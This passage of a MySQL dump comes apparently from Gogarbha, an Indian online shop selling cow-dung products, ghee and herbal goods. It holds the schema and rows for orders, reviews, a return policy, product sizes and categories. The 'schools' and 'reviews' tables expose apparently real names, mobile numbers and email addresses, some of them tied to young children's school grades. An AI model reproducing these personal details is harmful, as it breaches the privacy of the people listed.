(205, 30, 'assets/project_images/14459453471.jpg'),
(201, 29, 'assets/project_images/14459442782.jpg'),
(202, 29, 'assets/project_images/14459444183.jpg'),
(203, 29, 'assets/project_images/14459443524.jpg'),
(199, 29, 'assets/project_images/14459449940.jpg'),
(195, 26, 'assets/project_images/14459445510.jpg'),
(192, 24, 'assets/project_images/14459430791.jpg'),
(193, 24, 'assets/project_images/14459429092.jpg'),
(194, 25, 'assets/project_images/14459440670.jpg'),
(191, 24, 'assets/project_images/14459436880.jpg'),
(189, 19, 'assets/project_images/14459424980.jpg'),
(123, 18, 'assets/project_images/14451977361.jpg'),
(190, 23, 'assets/project_images/14459428290.jpg'),
(122, 18, 'assets/project_images/14451977480.jpg'),
(141, 18, 'assets/project_images/14452006306.jpg'),
(142, 18, 'assets/project_images/14452007047.jpg'),
(186, 20, 'assets/project_images/14459424603.jpg'),
(204, 30, 'assets/project_images/14459444690.jpg'),
(200, 29, 'assets/project_images/14459452991.jpg'),
(185, 20, 'assets/project_images/14459432182.jpg'),
(184, 20, 'assets/project_images/14459428571.jpg'),
(187, 21, 'assets/project_images/14459432700.jpg'),
(183, 20, 'assets/project_images/14459425650.jpg'),
(198, 28, 'assets/project_images/14459447520.jpg'),
(196, 27, 'assets/project_images/14459444810.jpg'),
(197, 27, 'assets/project_images/14459448001.jpg'),
(188, 22, 'assets/project_images/14459428250.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `releaseorder`
--

CREATE TABLE `releaseorder` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `designation` varchar(200) NOT NULL,
  `cno` varchar(30) NOT NULL,
  `client` varchar(255) NOT NULL,
  `gstno` varchar(70) NOT NULL,
  `addr` text NOT NULL,
  `email` varchar(100) NOT NULL,
  `web` varchar(150) NOT NULL,
  `m` varchar(255) NOT NULL,
  `bookedby` varchar(255) NOT NULL,
  `rono` varchar(30) NOT NULL,
  `adcap` varchar(255) NOT NULL,
  `dur` varchar(150) NOT NULL,
  `noofinsertion` varchar(255) NOT NULL,
  `totalfct` varchar(255) NOT NULL,
  `er` varchar(255) NOT NULL,
  `lband` varchar(100) NOT NULL,
  `astonband` varchar(100) NOT NULL,
  `spotros` varchar(255) NOT NULL,
  `spotrodp` varchar(255) NOT NULL,
  `scroll` varchar(255) NOT NULL,
  `slot` varchar(255) NOT NULL,
  `others` varchar(255) NOT NULL,
  `from` varchar(255) NOT NULL,
  `to` varchar(255) NOT NULL,
  `tofdays` varchar(255) NOT NULL,
  `total` varchar(50) NOT NULL,
  `ros` varchar(255) NOT NULL,
  `rodp` varchar(200) NOT NULL,
  `prog` varchar(255) NOT NULL,
  `rodptimings` varchar(200) NOT NULL,
  `byhand` varchar(50) NOT NULL,
  `byemail` varchar(100) NOT NULL,
  `photoe` varchar(255) NOT NULL,
  `asenclosed` varchar(255) NOT NULL,
  `specialins` varchar(255) NOT NULL,
  `valueadded` varchar(255) NOT NULL,
  `billmount` varchar(100) NOT NULL,
  `gst` varchar(150) NOT NULL,
  `deduction` varchar(255) NOT NULL,
  `totalpay` varchar(255) NOT NULL,
  `chq` varchar(255) NOT NULL,
  `cash` varchar(255) NOT NULL,
  `neft` varchar(255) NOT NULL,
  `upi` varchar(255) NOT NULL,
  `rupees` varchar(100) NOT NULL,
  `rdate` varchar(70) NOT NULL,
  `place` varchar(150) NOT NULL,
  `msign` varchar(255) NOT NULL,
  `csign` varchar(255) NOT NULL,
  `status` tinyint(4) NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `releaseorder`
--

INSERT INTO `releaseorder` (`id`, `name`, `designation`, `cno`, `client`, `gstno`, `addr`, `email`, `web`, `m`, `bookedby`, `rono`, `adcap`, `dur`, `noofinsertion`, `totalfct`, `er`, `lband`, `astonband`, `spotros`, `spotrodp`, `scroll`, `slot`, `others`, `from`, `to`, `tofdays`, `total`, `ros`, `rodp`, `prog`, `rodptimings`, `byhand`, `byemail`, `photoe`, `asenclosed`, `specialins`, `valueadded`, `billmount`, `gst`, `deduction`, `totalpay`, `chq`, `cash`, `neft`, `upi`, `rupees`, `rdate`, `place`, `msign`, `csign`, `status`, `created_at`) VALUES
(1, 'demo123', 'demo123', '9986571768', 'International aura', '3442', 'de', 'd@gmail.com', 'https://showmytrade.com/', 'dd', 'dd', 'dd', 'dd', 'dd', 'dd', 'dd', 'dd', '1', '1', '1', '1', '1', '1', '1', 'dd', 'dd', 'dd', 'dd', '1', '1', '1', 'dd', '1', '1', '1', '1', 'ddd', 'dd', '600', '700', '800', '900', '500', '600', '700', '800', 'dd', '17-05-2022', 'Bengaluru', '', '', 0, '2022-05-20 09:49:53');

-- --------------------------------------------------------

--
-- Table structure for table `return_policy`
--

CREATE TABLE `return_policy` (
  `id` int(11) NOT NULL,
  `returnpolicy` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `return_policy`
--

INSERT INTO `return_policy` (`id`, `returnpolicy`) VALUES
(1, '<p>Thank you for shopping at <a href=\"http://www.gogarbha.com\">www.gogarbha.com</a> operated by Gogarbha.</p>\r\n<p>We offer refund and/or exchange within the first 0 days of your purchase, if 0 days have passed since your purchase, you will not be offered a refund and/or exchange of any kind.</p>\r\n<p>Note: If there is no Refund &amp; Replacement options available please mention explicitly.</p>\r\n<p><strong>ELIGIBILITY FOR REFUND AND EXCHANGE</strong></p>\r\n<ul>\r\n<li>Your item must be unused and in the same condition that you received it.</li>\r\n<li>The item must be in the original packaging.</li>\r\n<li>To complete your return, we require a receipt or proof of purchase.</li>\r\n</ul>\r\n<p><strong>RETURN POLICY</strong></p>\r\n<p>1. Applicable products are returnable within the applicable return window if you&rsquo;ve received them in a condition that is physically damaged, defective or different from their description on the product detail page on Gogarbha.</p>\r\n<p>2. Return will be processed only if:</p>\r\n<ul>\r\n<li>It is determined that the product was not damaged while in your possession;</li>\r\n<li>The product is not different from what was shipped to you;</li>\r\n<li>The product is returned in original condition</li>\r\n</ul>\r\n<p>3. Products marked as &amp; \"non-returnable\" on the product detail page cannot be returned.</p>\r\n<p><strong>EXCHANGE</strong></p>\r\n<p>We only replace items if they are defective or damaged. If you need to exchange it for the same item, send us an email at support@gogarbha.com and send your item to our relevant address.</p>\r\n<p><strong>REFUND</strong></p>\r\n<p>After we receive your item, our team of professionals will inspect it and process your refund. The money will be refunded to the original payment method you&rsquo;ve used during the purchase.</p>\r\n<p>Shipping costs are non-refundable! If you receive a refund, the cost of return shipping will be deducted from your refund.</p>');

-- --------------------------------------------------------

--
-- Table structure for table `reviews`
--

CREATE TABLE `reviews` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `email` text NOT NULL,
  `review_descp` text NOT NULL,
  `rating` int(11) NOT NULL,
  `psid` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `status` int(11) NOT NULL DEFAULT '3' COMMENT '0->approved,1->reject,2->pending;3->new',
  `approved_date` datetime NOT NULL,
  `user_id` int(11) NOT NULL,
  `pid` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `reviews`
--

INSERT INTO `reviews` (`id`, `name`, `email`, `review_descp`, `rating`, `psid`, `created_date`, `status`, `approved_date`, `user_id`, `pid`) VALUES
(19, 'syed afroz', 'developerweb50@gmail.com', 'dmeo', 4, 317, '2022-02-25 14:58:42', 0, '2022-02-25 14:58:42', 1, 0),
(18, 'syed afroz', 'developerweb50@gmail.com', 'demo', 3, 263, '2022-02-25 14:57:42', 0, '2022-02-25 14:57:42', 1, 0),
(20, 'syed afroz', 'developerweb50@gmail.com', 'dmeo', 4, 263, '2022-02-25 18:12:28', 0, '2022-02-25 18:12:28', 1, 0),
(21, 'syed afroz', 'developerweb50@gmail.com', 'demo', 4, 266, '2022-02-25 20:40:17', 0, '2022-02-25 20:40:17', 1, 181),
(22, 'syed afroz', 'developerweb50@gmail.com', 'dmeo', 4, 295, '2022-02-25 20:54:42', 0, '2022-02-25 20:54:42', 1, 210),
(23, 'Savithru', 'savithru@gmail.com', 'I have not tried this product. But I guess it will be good', 5, 361, '2022-02-28 17:54:30', 0, '2022-02-28 17:54:30', 15, 267),
(24, 'Savithru', 'savithru@gmail.com', 'Good Product', 5, 358, '2022-02-28 17:57:14', 0, '2022-02-28 17:57:14', 15, 264),
(28, 'syed afroz', 'developerweb50@gmail.com', 'dmeo', 4, 367, '2022-03-01 13:14:22', 0, '2022-03-01 13:14:22', 1, 273),
(27, 'syed afroz', 'developerweb50@gmail.com', 'demos', 4, 300, '2022-03-01 08:57:02', 0, '2022-03-01 08:57:02', 1, 215),
(32, 'syed afroz', 'developerweb50@gmail.com', 'ddd', 4, 180, '2022-03-01 16:50:45', 0, '2022-03-01 16:50:45', 1, 112),
(31, 'sh', 'sh@gmail.com', 'dd', 4, 367, '2022-03-01 13:21:56', 0, '2022-03-01 13:21:56', 3, 273),
(39, 'sh', 'sh@gmail.com', 'Good Product', 4, 318, '2022-03-02 11:05:25', 0, '2022-03-02 11:05:25', 3, 233),
(40, 'sh', 'sh@gmail.com', 'Nice product', 3, 329, '2022-03-02 12:20:20', 1, '2022-03-02 12:20:20', 3, 244),
(38, 'sh', 'sh@gmail.com', 'Good Product Loveddd... it!', 5, 299, '2022-03-02 10:55:23', 0, '2022-03-02 10:55:23', 3, 214),
(41, 'Ashwin', 'ashwin@savithru.com', 'Nice Product', 5, 358, '2022-03-03 15:21:31', 3, '2022-03-03 15:21:31', 5, 264),
(42, 'Ashwin', 'ashwin@savithru.com', 'Niceproduct', 3, 235, '2022-03-03 16:02:38', 0, '0000-00-00 00:00:00', 5, 0),
(43, 'syed afroz', 'developerweb50@gmail.com', 'dmeo', 4, 358, '2022-03-08 11:08:24', 0, '2022-03-08 11:08:24', 1, 264),
(44, 'ashwini', 'ashwiniravi677@gmail.com', 'Good product', 5, 367, '2022-03-09 16:06:29', 0, '2022-03-09 16:06:29', 10, 273),
(45, 'Ashwin', 'ashwin@savithru.com', 'Testreview', 4, 25, '2022-04-11 16:53:50', 0, '0000-00-00 00:00:00', 5, 0),
(46, 'Prem', 'pmuddugere@gmail.com', 'good', 5, 76, '2023-02-25 15:35:06', 3, '2023-02-25 15:35:06', 44, 76);

-- --------------------------------------------------------

--
-- Table structure for table `schools`
--

CREATE TABLE `schools` (
  `s_id` int(11) NOT NULL,
  `sname` varchar(60) NOT NULL,
  `pname` varchar(60) NOT NULL,
  `mobile` varchar(12) NOT NULL,
  `email` varchar(160) NOT NULL,
  `branch` varchar(50) NOT NULL,
  `section` varchar(70) NOT NULL,
  `grade` varchar(50) NOT NULL,
  `notification` varchar(255) NOT NULL,
  `status` int(11) NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `schools`
--

INSERT INTO `schools` (`s_id`, `sname`, `pname`, `mobile`, `email`, `branch`, `section`, `grade`, `notification`, `status`, `created_at`) VALUES
(6, 'Harsh', 'Deepak', '0000', 'gangula.sugit@gmail.com', 'NPSHoramavu', 'A', '6', 'yes', 0, '2022-12-10 12:16:46'),
(7, 'Anuvrat', 'na', '9741409146', 'na', 'na', 'na', 'na', 'no', 0, '2022-12-10 12:18:35'),
(8, 'Harshita', 'na', '9873981560', 'na', 'na', 'na', 'na', 'no', 0, '2022-12-10 12:19:34'),
(9, 'Jziona', 'Gladys', '9940631782', 'na', 'chennai', 'na', 'na', 'no', 0, '2022-12-10 12:20:29'),
(10, 'kaira.a.j', 'ArvindR', '8879986008', 'na', 'na', 'na', 'LKG', 'no', 0, '2022-12-10 12:40:48'),
(11, 'saichandchinta', 'na', '8886454540', 'na', 'na', 'na', 'Montessori', 'no', 0, '2022-12-10 14:42:19'),
(12, 'subhama', 'na', '8095162000', 'na', 'na', 'na', 'Montessori', 'no', 0, '2022-12-10 14:45:20'),
(13, 'GaneshB', 'santhosh', '9742112999', 'na', 'na', 'na', 'LKG', 'no', 0, '2022-12-10 14:46:26'),
(14, 'ArunKumarreddy', 'na', '9701687787', 'na', 'na', 'na', 'LKG', 'no', 0, '2022-12-10 14:47:00'),
(15, 'shreprakash', 'na', '9741344662', 'na', 'na', 'na', '5th', 'no', 0, '2022-12-10 14:48:28'),
(16, 'vedantjain', 'na', '9999084052', 'na', 'na', 'na', '7th', 'no', 0, '2022-12-10 14:49:03'),
(17, 'akauvchajain', 'na', '8884958222', 'na', 'na', 'na', '1st', 'no', 0, '2022-12-10 15:54:33'),
(18, 'aadritsemodak', 'na', '9886607780', 'na', 'na', 'na', 'KG-2', 'no', 0, '2022-12-10 15:55:10'),
(19, 'aadritsemodak', 'na', '9886607780', 'na', 'na', 'na', 'na', 'no', 0, '2022-12-10 16:53:00'),
(20, 'anaahat', 'jagmeet', '9900547774', 'na', 'na', 'na', 'UKG', 'no', 0, '2022-12-12 10:16:57'),
(21, 'shrinitha', 'sneha', '9113071135', 'na', 'na', 'na', 'LKG', 'no', 0, '2022-12-12 10:17:39'),
(22, 'subash', 'na', '8861846924', 'na', 'na', 'na', '3rd', 'no', 0, '2022-12-12 10:24:04'),
(23, 'madhu', 'na', '9422643469', 'na', 'na', 'na', 'Montessori', 'no', 0, '2022-12-12 10:25:27'),
(24, 'na', 'kalappa', '9980003722', 'na', 'na', 'na', '7th', 'no', 0, '2022-12-12 10:26:06'),
(25, 'harsh', 'joshi', '9591997675', 'na', 'na', 'na', 'Montessori', 'no', 0, '2022-12-12 10:26:52'),
(26, 'vaithyonathan', 'na', '9845194073', 'na', 'na', 'na', '7th', 'no', 0, '2022-12-12 10:27:55'),
(27, 'Nathan', 'Manojkumar', '9902914757', 'na', 'na', 'na', 'UKG', 'no', 0, '2022-12-12 10:29:18'),
(28, 'praveer', 'vinay', '9986288143', 'na', 'na', 'na', '2nd', 'no', 0, '2022-12-12 10:30:17'),
(29, 'prabhakar', 'na', '9246369156', 'na', 'na', 'na', 'Montessori', 'no', 0, '2022-12-12 10:31:21'),
(30, 'ManyaKumarsharma', 'na', '7204322374', 'na', 'na', 'na', 'na', 'no', 0, '2022-12-12 10:32:18'),
(31, 'sathyanarayan', 'na', '9108762123', 'na', 'na', 'na', '2nd', 'no', 0, '2022-12-12 10:33:20'),
(32, 'aadarsh', 'bhimashankar', '8320293766', 'na', 'na', 'na', '2nd', 'no', 0, '2022-12-12 10:34:05'),
(33, 'ranjangupta', 'na', '9986307796', 'na', 'na', 'na', 'UKG', 'no', 0, '2022-12-12 10:35:19'),
(34, 'T.S.Arvind', 'na', '9663330537', 'na', 'na', 'na', 'UKG', 'no', 0, '2022-12-12 10:35:53'),
(35, 'thanvika', 'dhaneesh', '9946088840', 'na', 'na', 'na', 'na', 'no', 0, '2022-12-12 10:36:32'),
(36, 'abhinavverma', 'na', '9686999563', 'na', 'na', 'na', 'na', 'no', 0, '2022-12-12 10:37:08'),
(37, 'roohisyed', 'na', '9423791687', 'na', 'na', 'na', 'na', 'no', 0, '2022-12-12 10:37:38');

-- --------------------------------------------------------

--
-- Table structure for table `settings`
--

CREATE TABLE `settings` (
  `id` int(11) NOT NULL,
  `delivery_days` int(11) NOT NULL,
  `invoice_tax` varchar(15) NOT NULL,
  `incentive_per` float NOT NULL,
  `order_email` text NOT NULL,
  `product_terms` varchar(20000) NOT NULL,
  `delivery_charges` varchar(20) NOT NULL,
  `phone` text NOT NULL,
  `time` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `settings`
--

INSERT INTO `settings` (`id`, `delivery_days`, `invoice_tax`, `incentive_per`, `order_email`, `product_terms`, `delivery_charges`, `phone`, `time`) VALUES
(1, 4, '18', 5, 'support@gogarbha.com', '<p><strong>Product:</strong> &nbsp; &nbsp;<br />The images represent the actual product though colour of the image and product may slightly vary.Please check the product carefully at the time of delivery for any damages as we do not do exchange or refund after the order has been closed after you sign the acknowledgement.&nbsp;</p>\n<p><strong>Orders: &nbsp; &nbsp;</strong><br />You will receive confirmation emails/SMS when you have placed the order.We will process your order and ship the product to the shipping address provided by you.Our Delivery team will give a confirmation call to the contact number provided by you during the orders.</p>', '50', '+91 9886203199', '9:30am - 6:30PM');

-- --------------------------------------------------------

--
-- Table structure for table `sizes`
--

CREATE TABLE `sizes` (
  `id` int(255) NOT NULL,
  `name` varchar(2000) NOT NULL,
  `page_url` text NOT NULL,
  `order_no` varchar(2000) NOT NULL,
  `status` varchar(2000) NOT NULL COMMENT '0 - ACTIVE, 1- DEACTIVE,2-DELETE'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `sizes`
--

INSERT INTO `sizes` (`id`, `name`, `page_url`, `order_no`, `status`) VALUES
(99, '10', '10', '1', '2'),
(123, '10 pcs', '10-pcs', '1', '0'),
(97, '250 gm', '250-gm', '1', '0'),
(95, '200 gm', '200-gm', '1', '0'),
(94, '5 gm', '5-gm', '1', '0'),
(93, '100 gm', '100-gm', '1', '0'),
(92, '125 gm', '125-gm', '1', '0'),
(88, '50 gm', '50-gm', '1', '0'),
(87, '40 gm', '40-gm', '1', '0'),
(86, '30 gm', '30-gm', '1', '0'),
(85, '20 gm', '20-gm', '1', '0'),
(84, '10 gm', '10-gm', '1', '0'),
(83, '50 ml', '50-ml', '1', '0'),
(82, '40 ml', '40-ml', '1', '0'),
(81, '30 ml', '30-ml', '1', '0'),
(80, '20 ml', '20-ml', '1', '0'),
(79, '10 ml', '10-ml', '1', '0'),
(78, '150 gm', '150-gm', '1', '0'),
(76, '100 ml', '100-ml', '1', '0'),
(75, '200 ml', '200-ml', '1', '0'),
(77, '250 ml', '250-ml', '1', '0'),
(106, '50gms', '50gms', '1', '0'),
(107, '100gms', '100gms', '1', '0'),
(108, '150gms', '150gms', '1', '0'),
(109, '150ml', '150ml', '1', '0'),
(110, '500ml', '500ml', '1', '0'),
(111, '15ml', '15ml', '1', '0'),
(112, '8ml', '8ml', '1', '0'),
(113, '1Kg', '1kg', '1', '0'),
(114, '1 ltr', '1ltr', '1', '0'),
(115, '2kg', '2kg', '1', '0'),
(117, 'half liter', 'half-liter', '1', '0'),
(118, '100 Pills', '100-pills', '1', '0'),
(119, '1 Kg', '1-kg', '1', '0'),
(120, 'Pack 4', 'pack4', '1', '0'),
(121, 'Pack 1', 'pack1', '1', '0'),
(122, '25', '25', '1', '0'),
(124, '12 ml', '12', '1', '0'),
(125, '12 Pcs', '12-pcs', '1', '0'),
(126, 'Small 6pcs', '6pcs', '1', '0'),
(127, 'Big 6pcs', '6pcs-1', '1', '0'),
(128, 'Small 12pcs', 'small-12pcs', '1', '0'),
(129, 'Big 12pcs', 'big-12pcs', '1', '0'),
(130, '6pcs', '6pcs-2', '1', '0'),
(131, 'Small 1pc', 'small-1pc', '1', '0'),
(132, 'Big 1pc', 'big-1pc', '1', '0');

-- --------------------------------------------------------

--
-- Table structure for table `social_links`
--

CREATE TABLE `social_links` (
  `id` int(255) NOT NULL,
  `facebook` text NOT NULL,
  `twitter` text NOT NULL,
  `rssfeeds` text NOT NULL,
  `googleplus` text NOT NULL,
  `insta` text NOT NULL,
  `youtube` text NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `social_links`
--

INSERT INTO `social_links` (`id`, `facebook`, `twitter`, `rssfeeds`, `googleplus`, `insta`, `youtube`, `status`) VALUES
(1, 'https://www.facebook.com/Gogarbha', 'https://twitter.com/gogarbha', 'https://www.linkedin.com/company/gogarbha', 'https://www.youtube.com/channel/UCMgaRPBwFgff5VCJusA4qng', 'https://www.instagram.com/gogarbha/', '', 0);

-- --------------------------------------------------------

--
-- Table structure for table `special_banner`
--

CREATE TABLE `special_banner` (
  `id` int(11) NOT NULL,
  `description` text NOT NULL,
  `spcl_img` text NOT NULL,
  `banner` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `special_banner`
--

INSERT INTO `special_banner` (`id`, `description`, `spcl_img`, `banner`) VALUES
(1, '<p>At <span style=\"font-weight: 400;\">Dhrtva</span> we believe that beauty is a feeling, the radiance of the inside beauty enhances the outer. We aim to revive the use of all-natural ingredients passed on by our ancestors who contributed to the overall wellness of mankind.</p>\n<p><br />At <span style=\"font-weight: 400;\">Dhrtva</span> we believe what we cannot eat, we cannot risk applying on the skin. Check out our range of products made up of natural ingredients based on fruits, flowers, and herb combinations. Why Us: &middot; 100% Natural Ingredients.</p>\n<p><br />Paraben free &amp; SLS Free &middot; Eco-friendly packaging. &middot; Cruelty-free &middot; Fair price &middot; We believe in giving back to where it comes from.. Creating Sustainable Livelihood in Rural &amp; Tribal communities</p>', 'assets/spcl_banner/about16400676431.jpg', 'assets/spcl_banner/about16400676431.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `states`
--

CREATE TABLE `states` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `states`
--

INSERT INTO `states` (`id`, `name`, `status`) VALUES
(1, 'Karnataka', 0),
(2, 'Tamilnadu', 1),
(12, 'Andhra Pradesh', 2),
(13, 'Andhra Pradesh', 0),
(14, 'Arunachal Pradesh', 0),
(15, 'Assam', 0),
(16, 'Bihar', 0),
(17, 'Chennai', 0),
(18, 'Chhattisgarh', 0),
(19, 'Delhi', 0),
(20, 'Goa', 0),
(21, 'Gujarat', 0),
(22, 'Haryana', 0),
(23, 'Himachal Pradesh', 0),
(24, 'Jharkhandh', 0),
(25, 'Kerala', 0),
(26, 'Madhya Pradesh', 0),
(27, 'Maharashtra', 0),
(28, 'Manipur', 0),
(29, 'Meghalaya', 0),
(30, 'Mizoram', 0),
(31, 'Nagaland', 0),
(32, 'Odisha', 0),
(33, 'Pondicherry', 0),
(34, 'Punjab', 0),
(35, 'Rajasthan', 0),
(36, 'Sikkim', 0),
(37, 'Tamil Nadu', 0),
(38, 'Telangana', 0),
(39, 'Tripura', 0),
(40, 'Uttar Pradesh', 0),
(41, 'Uttarakhand', 0),
(42, 'West Bengal', 0);

-- --------------------------------------------------------

--
-- Table structure for table `subcategory`
--

CREATE TABLE `subcategory` (
  `id` int(11) NOT NULL,
  `category_id` int(11) NOT NULL,
  `name` text NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `status` int(11) NOT NULL,
  `page_url` text NOT NULL,
  `order_no` varchar(255) NOT NULL,
  `type` tinyint(2) NOT NULL COMMENT '1->b2c;2->b2b;0->both'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `subcategory`
--

INSERT INTO `subcategory` (`id`, `category_id`, `name`, `created_date`, `modified_date`, `status`, `page_url`, `order_no`, `type`) VALUES
(1, 1, 'Face Care', '2022-01-28 12:02:36', '0000-00-00 00:00:00', 1, 'face-care', '1', 0),
(2, 1, 'Cow Ghee', '2022-01-28 23:24:06', '0000-00-00 00:00:00', 1, 'cow-ghee', '2', 0),
(3, 12, 'Cowdung Cake', '2022-01-28 23:24:41', '2022-07-18 09:42:13', 0, 'cow-dung', '3', 0),
(4, 1, 'Cow Dung Diyas', '2022-01-28 23:25:38', '0000-00-00 00:00:00', 2, 'cow-dung-diyas', '4', 0),
(5, 1, 'Cow Milk', '2022-01-28 23:26:25', '0000-00-00 00:00:00', 1, 'cow-milk', '5', 0),
(6, 1, 'Cow Dung Sticks', '2022-01-28 23:26:57', '0000-00-00 00:00:00', 1, 'cow-dung-sticks', '6', 0),
(7, 1, 'Cow Dung Ash', '2022-01-28 23:27:30', '0000-00-00 00:00:00', 1, 'cow-dung-ash', '7', 0),
(8, 1, 'Cow Dung Vibhuti', '2022-01-28 23:28:13', '0000-00-00 00:00:00', 1, 'cow-dung-vibhuti', '8', 0),
(9, 1, 'Pain Balm', '2022-01-28 23:28:51', '0000-00-00 00:00:00', 2, 'pain-balm', '9', 0),
(10, 1, 'Diyas with Ghee', '2022-01-28 23:29:27', '0000-00-00 00:00:00', 1, 'diyas-with-ghee', '10', 0),
(11, 1, 'Cow Dung Hawan Cup', '2022-01-29 12:38:09', '0000-00-00 00:00:00', 1, 'cow-dung-hawan-cup', '1', 0),
(12, 1, 'Kashaya Amrutham', '2022-02-15 12:02:07', '0000-00-00 00:00:00', 0, 'kashaya-amrutham', '1', 0),
(13, 4, 'Gulika Amrutham', '2022-02-15 15:47:38', '2022-02-15 17:59:33', 0, 'general-health-all-kinds-of-diseases', '1', 0),
(14, 5, 'Churnika Amrutham', '2022-02-15 16:47:58', '2022-02-15 17:59:24', 0, 'churnika-amrutham-ca', '1', 0),
(15, 6, 'Soundarya Amrutham', '2022-02-15 17:13:42', '2022-02-15 17:57:55', 0, 'soundarya-amrutham-sa', '1', 0),
(16, 7, 'Thailamrutham', '2022-02-16 09:38:34', '2022-07-18 06:41:49', 0, 'thaila-and-lepana-amrutham', '1', 0),
(17, 8, 'Paushtika Amrutham', '2022-02-16 10:39:05', '0000-00-00 00:00:00', 0, 'paushtika-amrutham', '1', 0),
(18, 9, 'Vanaraksha Amrutham', '2022-02-16 11:17:19', '2022-07-18 06:50:33', 0, 'vana-raksha-amrutham', '1', 0),
(19, 11, 'Milk', '2022-03-25 09:37:40', '2022-03-25 11:06:46', 0, 'milk', '7', 0),
(20, 11, 'Yogurt', '2022-03-25 10:54:41', '2022-03-25 11:06:30', 0, 'yogurt', '6', 0),
(21, 11, 'Cheese', '2022-03-25 10:56:05', '2022-03-25 11:06:03', 0, 'cheese', '5', 0),
(22, 11, 'Butter', '2022-03-25 10:56:34', '2022-03-25 11:05:41', 0, 'butter', '4', 0),
(23, 11, 'Milk Powder', '2022-03-25 10:56:58', '2022-03-25 11:05:26', 0, 'milk-powder', '3', 0),
(24, 11, 'Paneer', '2022-03-25 10:58:04', '2022-03-25 11:05:16', 0, 'paneer', '2', 0),
(25, 11, 'Curd', '2022-03-25 10:58:41', '2022-03-28 09:31:31', 0, 'cream', '1', 0),
(26, 12, 'Diyas', '2022-03-31 06:20:30', '0000-00-00 00:00:00', 0, 'diyas', '1', 0),
(27, 12, 'Cowdung Dhoop Sticks', '2022-03-31 06:22:45', '2022-07-18 08:42:01', 0, 'dhoop-sticks', '2', 0),
(28, 12, 'Agarbatti', '2022-03-31 06:23:25', '2022-06-02 10:31:24', 1, 'agarbathis', '3', 0),
(29, 12, 'Cowdung Powder', '2022-03-31 06:24:05', '0000-00-00 00:00:00', 2, 'cowdung-powder', '4', 0),
(30, 12, 'Cowdung Fertilizer', '2022-03-31 06:24:28', '0000-00-00 00:00:00', 2, 'cowdung-fertilizer', '5', 0),
(31, 12, 'Vibhoothi', '2022-03-31 06:24:49', '2022-03-31 06:26:57', 1, 'vibhuthi', '6', 0),
(32, 12, 'Cowdung Bhasma', '2022-03-31 06:27:47', '0000-00-00 00:00:00', 1, 'cowdung-bhasma', '7', 0),
(33, 12, 'Cowdung Bricks', '2022-03-31 06:28:12', '0000-00-00 00:00:00', 2, 'cowdung-bricks', '8', 0),
(34, 12, 'Cowdung Samhidhi', '2022-03-31 06:29:18', '0000-00-00 00:00:00', 1, 'cowdung-samhidhi', '9', 0),
(35, 12, 'Cowdung Sambrani Cups', '2022-03-31 06:29:44', '2022-07-18 08:40:33', 0, 'cowdung-sambrani-cups', '10', 0),
(36, 12, 'Cowdung Pots', '2022-03-31 06:30:17', '0000-00-00 00:00:00', 2, 'cowdung-pots', '11', 0),
(37, 12, 'Cowdung Bricks', '2022-04-08 09:33:44', '2022-07-18 08:41:29', 1, 'cow-dung-bricks', '1', 0),
(38, 12, 'Cow dung fertilizer', '2022-04-08 09:39:58', '0000-00-00 00:00:00', 2, 'cow-dung-fertilizer', '1', 0),
(39, 12, 'Cowdung Powder', '2022-04-08 09:47:43', '2022-07-18 08:41:22', 1, 'cow-dung-powder', '1', 0),
(40, 12, 'Samidhalu', '2022-04-08 09:57:49', '0000-00-00 00:00:00', 1, 'samidhalu', '1', 0),
(41, 9, 'Phenoyl', '2022-06-27 06:14:04', '2022-07-22 06:09:53', 0, 'gou-clean-phenyl', '1', 0),
(42, 12, 'Cowdung Sambrani Cones', '2022-07-18 04:55:25', '2022-07-18 08:40:46', 0, 'sambrani-cones', '1', 0),
(43, 12, 'Batti', '2022-07-18 08:38:59', '2022-07-18 10:10:58', 2, 'lightning', '1', 0),
(44, 12, 'Cowdung Dhoop Sticks', '2022-07-18 08:40:08', '2022-07-18 08:40:39', 2, 'cow-dung-dhoop-sticks', '1', 0),
(45, 13, 'Rice', '2022-07-27 12:41:19', '2022-08-03 05:32:27', 0, 'coming-soon', '1', 0),
(46, 13, 'Pulses', '2022-08-03 09:53:35', '0000-00-00 00:00:00', 0, 'pulses', '1', 0),
(47, 13, 'Cereals & Millets', '2022-08-03 11:32:20', '2022-08-03 12:02:14', 0, 'cereals', '1', 0),
(48, 13, 'Ready To Eat', '2022-08-03 12:07:59', '2022-08-03 12:49:42', 0, 'ready-to-eat', '1', 0),
(49, 12, 'Mosquito Repellent', '2022-11-10 07:06:58', '0000-00-00 00:00:00', 0, 'mosquito-repellent', '5', 0);

-- --------------------------------------------------------

--
-- Table structure for table `sub_subcategory`
--

CREATE TABLE `sub_subcategory` (
  `id` int(11) NOT NULL,
  `subcategory_id` int(11) NOT NULL,
  `name` text NOT NULL,
  `cat_id` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `status` int(11) NOT NULL,
  `page_url` text NOT NULL,
  `order_no` varchar(255) NOT NULL,
  `type` tinyint(2) NOT NULL COMMENT '1->b2c;2->b2b;0->both'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `sub_subcategory`
--

